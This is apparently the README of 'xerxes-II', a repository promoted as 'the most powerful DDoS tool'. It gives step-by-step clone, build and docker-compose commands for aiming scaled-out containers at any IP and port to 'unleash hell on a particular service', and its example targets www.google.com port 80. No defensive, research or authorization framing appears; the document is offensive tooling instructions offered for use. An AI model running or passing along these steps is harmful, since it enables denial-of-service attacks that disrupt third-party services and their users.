# xerxes-ii
---
XERXES-ii is the most powerful  DDoS tool 

## Usage
### DDOS using Docker
*NOTE: Docker and DockerCompose must be installed on the host*
To unleash hell on a particular service 
- Clone the repository`$ git clone https://github.com/ahab94/xerxes-II.git`
- Change Directory to the xerxes-II `$ cd xerxes-II`
- Build a docker image image`$ sudo docker build . -t xerxes-ii:rc1`
- In docker-compose.yml define the IP and Port you want to do DDOS on for example.
```BASH
version: '2'
services:
  xerxes-ii-some-service-1:
    image: xerxes-ii:rc3
    environment:
      - IP=some-service-1-ip-or-hostname
      - PORT=some-service-1-port

  xerxes-ii-some-service-2:
    image: xerxes-ii:rc3
    environment:
      - IP=some-service-2-ip-or-hostname
      - PORT=some-service-2-port

  xerxes-ii-some-service-3:
    image: xerxes-ii:rc3
    environment:
      - IP=some-service-3-ip-or-hostname
      - PORT=some-service-3-port
```
- Spawn N number of containers for DDOS `$ sudo docker-compose up --scale xerxes-ii-some-service-1=<number-of-nodes-for-DDOS>`

### Spawning container for dev env
- Build a docker image image`$ sudo docker build . -t xerxes-ii:rc1`
- Initiate xerxes-II container `$ sudo docker run -e IP=www.google.com -e PORT=80 -it xerxes-ii:rc3`

### Spawning process for dev env
- Compile and build xerxes-II `$ gcc -o xerxes-II xerxes-II.c`
- Spawn the xerxes-II process `$ bash entrypoint-to-hell.sh`
